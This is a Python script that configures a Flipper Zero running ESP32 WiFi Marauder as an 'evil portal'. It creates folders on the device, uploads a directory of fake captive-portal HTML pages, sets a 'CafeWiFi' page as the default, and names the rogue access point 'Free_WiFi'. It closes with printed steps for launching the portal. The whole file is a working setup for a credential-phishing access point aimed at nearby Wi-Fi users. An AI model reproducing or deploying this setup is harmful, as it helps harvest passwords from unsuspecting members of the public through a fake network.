#!/usr/bin/env python3
"""Full Flipper Zero evil portal setup: upload portals + set AP name + configure everything."""

import serial, time, os

PORT = '/dev/cu.usbmodemflip_Tl1pzur1'
PORTALS_DIR = os.path.join(os.path.dirname(__file__), 'portals')
HTML_PATH = '/ext/apps_data/marauder/html'
AP_NAME = 'Free_WiFi'

ser = serial.Serial(PORT, 230400, timeout=2)
time.sleep(1)
ser.read(ser.in_waiting)

def send(cmd, wait=0.5):
    ser.write(b'\r\n')
    time.sleep(0.1)
    ser.read(ser.in_waiting)
    ser.write(f'{cmd}\r\n'.encode())
    time.sleep(wait)
    return ser.read(ser.in_waiting).decode(errors='replace')

def upload(local, remote):
    with open(local, 'rb') as f:
        data = f.read()
    send(f'storage remove {remote}', 0.3)
    send(f'storage write_chunk {remote} {len(data)}', 0.3)
    sent = 0
    while sent < len(data):
        ser.write(data[sent:sent+512])
        sent += 512
        time.sleep(0.01)
    time.sleep(0.5)
    ser.read(ser.in_waiting)

# Step 1: Create folder structure
print('=== Step 1: Creating folder structure ===')
send('storage mkdir /ext/apps_data', 0.3)
send('storage mkdir /ext/apps_data/marauder', 0.3)
send('storage mkdir /ext/apps_data/marauder/html', 0.3)
print('  /ext/apps_data/marauder/html/ ready')

# Step 2: Upload all portals
files = []
for root, dirs, filenames in os.walk(PORTALS_DIR):
    for f in filenames:
        if f.endswith('.html'):
            files.append(os.path.join(root, f))

total = len(files)
print(f'\n=== Step 2: Uploading {total} portals ===')
success = 0
for i, local in enumerate(files, 1):
    name = os.path.basename(local)
    remote = f'{HTML_PATH}/{name}'
    size = os.path.getsize(local)
    print(f'  [{i}/{total}] {name} ({size}B)...', end=' ', flush=True)
    try:
        upload(local, remote)
        print('OK')
        success += 1
    except Exception as e:
        print(f'ERR: {e}')

# Step 3: Set CafeWiFi as default
print('\n=== Step 3: Setting CafeWiFi as default index.html ===')
upload(os.path.join(PORTALS_DIR, 'custom/CafeWiFi.html'), f'{HTML_PATH}/index.html')
print('  index.html = CafeWiFi OK')

# Step 4: Set AP name via SSID command
print('\n=== Step 4: Setting AP name ===')
resp = send(f'ssid -a -n "{AP_NAME}"', 1)
print(f'  Added SSID: {AP_NAME}')

# Step 5: Verify
print('\n=== Step 5: Verifying ===')
resp = send('list -s', 1)
for line in resp.strip().split('\n'):
    l = line.strip()
    if l and '>' not in l and 'list' not in l.lower():
        print(f'  {l}')

ser.close()

print(f'\n{"="*45}')
print(f'  DONE! {success}/{total} portals uploaded')
print(f'  AP name: {AP_NAME}')
print(f'  Default portal: CafeWiFi')
print(f'{"="*45}')
print()
print('  On your Flipper:')
print('  1. Apps > GPIO > ESP32 WiFi Marauder')
print('  2. "Load Evil Portal HTML file" to pick one')
print('  3. evilportal -c start')
print('  4. stopscan to stop')
